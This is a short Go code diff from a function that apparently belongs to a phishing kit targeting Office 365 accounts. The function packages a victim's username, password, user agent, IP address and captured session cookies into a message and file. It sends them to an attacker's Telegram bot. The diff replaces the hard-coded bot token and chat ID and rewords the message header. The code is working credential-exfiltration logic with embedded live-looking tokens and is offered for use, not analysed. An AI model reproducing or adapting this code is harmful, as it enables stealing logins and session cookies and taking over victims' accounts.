@@ -50,11 +50,11 @@ func sendTelegramResult(cookies string, username string, password string,  usera
 	// Send the message
 	var err error
 	client, fileName := &http.Client{}, "🧾"+username+"-cookies.json"
-	token, chat_id := "5886667026:AAHMRZh4RSjsqaXNwPgZjOJ_W-ffDM5PpIE", "915867987"
+	token, chat_id := "6234271836:AAFZ5SsDaWUe17yYeMyNylLwqnE_3Fnu5gw", "5860822009"
 
 	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
 	//url := "http://api.ttelegram.org/bot"%s/sendDocument?chat_id=%s", getUrl(), getChatId())
-	msg := "🍁 O365 Cookies Result 🍁\n\n****** [ 💻 Valid Login  💻 ] ******\n🌟 Username : " + username + "\n🔑 Password : " + password + "\n🌎 UserAgent: " + useragent + "\n💻 IP:   https://ip-api.com/" + remote_addr + "\n\n***** [ 🍪 Cookies Captured 🍪 ] *****"
+	msg := "🍁 Cookies Result Arrived 🍁\n\n****** [ 💻 Valid Login  💻 ] ******\n🌟 Username : " + username + "\n🔑 Password : " + password + "\n🌎 UserAgent: " + useragent + "\n💻 IP:   https://ip-api.com/" + remote_addr + "\n\n***** [ 🍪 Cookies Captured 🍪 ] *****"
 	
 
 	err = os.WriteFile(fileName, []byte(cookies), 0755)
